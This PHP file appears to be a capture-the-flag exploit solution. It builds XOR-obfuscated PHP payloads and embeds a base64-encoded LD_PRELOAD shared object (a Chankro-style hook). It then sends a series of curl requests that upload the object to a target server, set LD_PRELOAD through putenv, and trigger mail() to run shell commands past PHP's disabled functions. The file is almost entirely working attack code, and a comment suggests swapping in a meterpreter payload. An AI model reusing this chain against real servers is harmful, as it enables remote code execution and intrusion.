<?php

function xor_encode($cmd) {
    $a = str_repeat(chr(0xaa), strlen($cmd));
    $encoded_cmd = $a ^ $cmd;

    return $a . '^' . $encoded_cmd;
}

$pld_mkdir = '$a=' . xor_encode('mkdir') . ';';
$pld_mkdir .= '$b=' . xor_encode('_REQUEST') . ';';
$pld_mkdir .= '$a($$b{0});';
echo urlencode($pld_mkdir);

echo strlen($pld_mkdir) . PHP_EOL;

$pld_file_get_contents = '$a=' . xor_encode('file_get_contents') . ';';
$pld_file_get_contents .= '$b=' . xor_encode('_REQUEST') . ';';
$pld_file_get_contents .= '$a($$b{0}, $$b{1});';

echo strlen($pld_file_get_contents) . PHP_EOL;

$pld_file_put_contents = '$a=' . xor_encode('file_put_contents') . ';';
$pld_file_put_contents .= '$b=' . xor_encode('_REQUEST') . ';';
$pld_file_put_contents .= '$a($$b{0}, $$b{1});';

echo strlen($pld_file_put_contents) . PHP_EOL;

$pld_putenv_and_mail = '$a=' . xor_encode('putenv') . ';';
$pld_putenv_and_mail .= '$b=' . xor_encode('_REQUEST') . ';';
$pld_putenv_and_mail .= '$c=' . xor_encode('mail') . ';';
$pld_putenv_and_mail .= '$a($$b{0});$a($$b{1});$c(0,0,0,0);';

echo strlen($pld_putenv_and_mail) . PHP_EOL;
// full exploit:
 $hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAYAgAAAAAAABAAAAAAAAAAAAXAAAAAAAAAAAAAEAAOAAGAEAAHAAZAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AoAAAAAAAD8CgAAAAAAAAAAIAAAAAAAAQAAAAYAAAAACwAAAAAAAAALIAAAAAAAAAsgAAAAAACQAgAAAAAAAJgCAAAAAAAAAAAgAAAAAAACAAAABgAAABgLAAAAAAAAGAsgAAAAAAAYCyAAAAAAANABAAAAAAAA0AEAAAAAAAAIAAAAAAAAAAQAAAAEAAAAkAEAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAAUOV0ZAQAAAAoCgAAAAAAACgKAAAAAAAAKAoAAAAAAAAsAAAAAAAAACwAAAAAAAAABAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAQAAAAUAAAAAwAAAEdOVQBpLsrmo0bxkg7SIDPHN+IrTkHdgQAAAAADAAAADwAAAAEAAAAGAAAAiMggBQIUYBkPAAAAEgAAABQAAABCRdXsYF29XLvjknzYcVgcuY3xDurT7w4an4gL7ZJz8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAJAHAHAAAAAAAAAAAAAAAAAAB5AAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACXAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABhAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAC2AAAAEgAAAAAAAAAAAAAAAAAAAAAAAACjAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAIAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABSAAAAIgAAAAAAAAAAAAAAAAAAAAAAAACeAAAAEgAAAAAAAAAAAAAAAAAAAAAAAADUAAAAEAAWAJANIAAAAAAAAAAAAAAAAACNAAAAEgALAJgJAAAAAAAAKAAAAAAAAADnAAAAEAAXAJgNIAAAAAAAAAAAAAAAAADbAAAAEAAXAJANIAAAAAAAAAAAAAAAAAAQAAAAEgAJAHAHAAAAAAAAAAAAAAAAAAAWAAAAEgAMAAQKAAAAAAAAAAAAAAAAAAB1AAAAEgALAGAJAAAAAAAAOAAAAAAAAACoAAAAEgALAMAJAAAAAAAAQgAAAAAAAAAAX19nbW9uX3N0YXJ0X18AX2luaXQAX2ZpbmkAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemUAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBwd24AZ2V0ZW52AGNobW9kAHN5c3RlbQBkYWVtb25pemUAc2lnbmFsAGZvcmsAZXhpdABnZXRldWlkAGRsc3ltAHVuc2V0ZW52AGxpYmRsLnNvLjIAbGliYy5zby42AF9lZGF0YQBfX2Jzc19zdGFydABfZW5kAEdMSUJDXzIuMi41AAAAAAACAAAAAgACAAAAAgAAAAIAAgAAAAMAAgACAAEAAQABAAEAAQABAAEAAQAAAAEAAQC/AAAAEAAAACAAAAB1GmkJAAADAOwAAAAAAAAAAQABAMoAAAAQAAAAAAAAAHUaaQkAAAIA7AAAAAAAAAAACyAAAAAAAAgAAAAAAAAAMAkAAAAAAAAICyAAAAAAAAgAAAAAAAAA8AgAAAAAAACIDSAAAAAAAAgAAAAAAAAAiA0gAAAAAADoDCAAAAAAAAYAAAADAAAAAAAAAAAAAADwDCAAAAAAAAYAAAAGAAAAAAAAAAAAAAD4DCAAAAAAAAYAAAAIAAAAAAAAAAAAAAAADSAAAAAAAAYAAAALAAAAAAAAAAAAAAAIDSAAAAAAAAYAAAANAAAAAAAAAAAAAAAoDSAAAAAAAAcAAAACAAAAAAAAAAAAAAAwDSAAAAAAAAcAAAAQAAAAAAAAAAAAAAA4DSAAAAAAAAcAAAAEAAAAAAAAAAAAAABADSAAAAAAAAcAAAAVAAAAAAAAAAAAAABIDSAAAAAAAAcAAAAFAAAAAAAAAAAAAABQDSAAAAAAAAcAAAAGAAAAAAAAAAAAAABYDSAAAAAAAAcAAAAHAAAAAAAAAAAAAABgDSAAAAAAAAcAAAAJAAAAAAAAAAAAAABoDSAAAAAAAAcAAAAKAAAAAAAAAAAAAABwDSAAAAAAAAcAAAAMAAAAAAAAAAAAAAB4DSAAAAAAAAcAAAANAAAAAAAAAAAAAACADSAAAAAAAAcAAAAOAAAAAAAAAAAAAABIg+wISIsFdQUgAEiFwHQF6GsAAABIg8QIwwAAAAAAAP81ggUgAP8lhAUgAA8fQAD/JYIFIABoAAAAAOng/////yV6BSAAaAEAAADp0P////8lcgUgAGgCAAAA6cD/////JWoFIABoAwAAAOmw/////yViBSAAaAQAAADpoP////8lWgUgAGgFAAAA6ZD/////JVIFIABoBgAAAOmA/////yVKBSAAaAcAAADpcP////8lQgUgAGgIAAAA6WD/////JToFIABoCQAAAOlQ/////yUyBSAAaAoAAADpQP////8lKgUgAGgLAAAA6TD///9IjT0pBSAASI0FKQUgAFVIKfhIieVIg/gOdhVIiwVmBCAASIXAdAld/+BmDx9EAABdw2ZmZmZmLg8fhAAAAAAASI096QQgAEiNNeIEIABVSCn+SInlSMH+A0iJ8EjB6D9IAcZI0f50GEiLBTEEIABIhcB0DF3/4GYPH4QAAAAAAF3DZmZmZmYuDx+EAAAAAACAPZkEIAAAdSdIgz0HBCAAAFVIieV0DEiLPXoEIADoLf///+hI////XcYFcAQgAAHzw2ZmZmZmLg8fhAAAAAAASI092QEgAEiDPwB1C+le////Zg8fRAAASIsFqQMgAEiFwHTpVUiJ5f/QXelA////VUiJ5UiNPaIAAADoMP7//77/AQAASInHuAAAAADofv7//0iNPYQAAADoEv7//0iJx+gq/v//XcNVSInlvgEAAAC/AQAAAOg1/v//6KD+//+FwHQKvwAAAADoYv7//13DVUiJ5UiD7BBIjTVGAAAASMfH/////+hV/v//SIlF+EiNPTcAAADoJf7//+jA/f//6Nv9//9Ii1X4uAAAAAD/0snDAABIg+wISIPECMNDSEFOS1JPAGdldGV1aWQATERfUFJFTE9BRAABGwM7LAAAAAQAAABo/f//SAAAADj///9wAAAAcP///5AAAACY////sAAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAABj9///QAAAAAA4QRg4YSg8LdwiA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AAAAAEAAAAAAAAAABAAAAAIAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAJAFAAAAAAAAkAUAAAAAAADAAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABQBgAAAAAAAFAGAAAAAAAAIAEAAAAAAAADAAAACgAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAcAcAAAAAAABwBwAAAAAAABoAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAAJAHAAAAAAAAkAcAAAAAAADQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABgCAAAAAAAAGAIAAAAAAAAogEAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACEAAAAAQAAAAYAAAAAAAAABAoAAAAAAAAECgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAigAAAAEAAAACAAAAAAAAAA0KAAAAAAAADQoAAAAAAAAbAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAJIAAAABAAAAAgAAAAAAAAAoCgAAAAAAACgKAAAAAAAALAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACgAAAAAQAAAAIAAAAAAAAAWAoAAAAAAABYCgAAAAAAAKQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAqgAAAA4AAAADAAAAAAAAAAALIAAAAAAAAAsAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALYAAAAPAAAAAwAAAAAAAAAICyAAAAAAAAgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADCAAAAAQAAAAMAAAAAAAAAEAsgAAAAAAAQCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAxwAAAAYAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAADQAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAANAAAAABAAAAAwAAAAAAAADoDCAAAAAAAOgMAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADVAAAAAQAAAAMAAAAAAAAAEA0gAAAAAAAQDQAAAAAAAHgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3gAAAAEAAAADAAAAAAAAAIgNIAAAAAAAiA0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOQAAAAIAAAAAwAAAAAAAACQDSAAAAAAAJANAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADpAAAAAQAAADAAAAAAAAAAAAAAAAAAAACQDQAAAAAAAB0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAArQ0AAAAAAADyAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAKAOAAAAAAAAAAYAAAAAAAAbAAAAKwAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACgFAAAAAAAAFwCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA';
$exploit_site = 'http://localhost:8019/';
$exploit_site = 'http://89.38.210.129:8095/';
//$exploit_site = 'http://localhost:8099/';
$fullpath = '/var/www/site/';
$exploit_folder = 'tmp/random_folder_with_solution';
$finalflagpath = '/got_flag';
$rce = 'echo "timctf" | /get_flag 2>&1 > ' . $fullpath . $exploit_folder . $finalflagpath;
$meterpreter = base64_encode($rce); // this, or generate your payload with chankro and paste it here

// generate chankro.so and acpid.socket, expecting the RCE in meterpreter
//
// exploit chain:
// mkdir('tmp/random_folder_with_solution');
shell_exec('curl -s -o /dev/null "' . $exploit_site . '" --data "0=' . $exploit_folder . '&k=' . urlencode($pld_mkdir) . '"');
// file_put_contents('tmp/random_folder_with_solution/chankro.so', $hook);
shell_exec('curl -s -o /dev/null "' . $exploit_site . '" --data "0=' . $exploit_folder . '/chankro.so&1=' . urlencode(base64_decode($hook)) . '&k=' . urlencode($pld_file_put_contents) . '"');
// file_put_contents('tmp/random_folder_with_solution/acpid.socket', $meterpreter);
shell_exec('curl -s -o /dev/null "' . $exploit_site . '" --data "0=' . $exploit_folder . '/acpid.socket&1=' . urlencode(base64_decode($meterpreter)) . '&k=' . urlencode($pld_file_put_contents) . '"');
// file_put_contents('tmp/random_folder_with_solution/acpid.socket', $meterpreter);
shell_exec('curl -s -o /dev/null "' . $exploit_site . '" --data "0=' . $exploit_folder . '/acpid.socket&1=' . urlencode(base64_decode($meterpreter)) . '&k=' . urlencode($pld_file_put_contents) . '"');
// putenv('CHANKRO=/var/www/site/tmp/random_folder_with_solution/acpid.socket')
// putenv('LD_PRELOAD=/var/www/site/tmp/random_folder_with_solution/chankro.so')
// mail(0,0,0,0); // to trigger the rce
$chankro = 'CHANKRO=' . $fullpath . $exploit_folder . '/acpid.socket';
$ldpreload = 'LD_PRELOAD=' . $fullpath . $exploit_folder . '/chankro.so';
shell_exec('curl -s -o /dev/null "' . $exploit_site . '?0=' . urlencode($chankro) . '&1=' . urlencode($ldpreload) . '&k=' . urlencode($pld_putenv_and_mail) . '"');

print "Here's your flag: ";
$finalurl = ($exploit_site . $exploit_folder . $finalflagpath);
print $finalurl;
print shell_exec('curl ' . $finalurl);

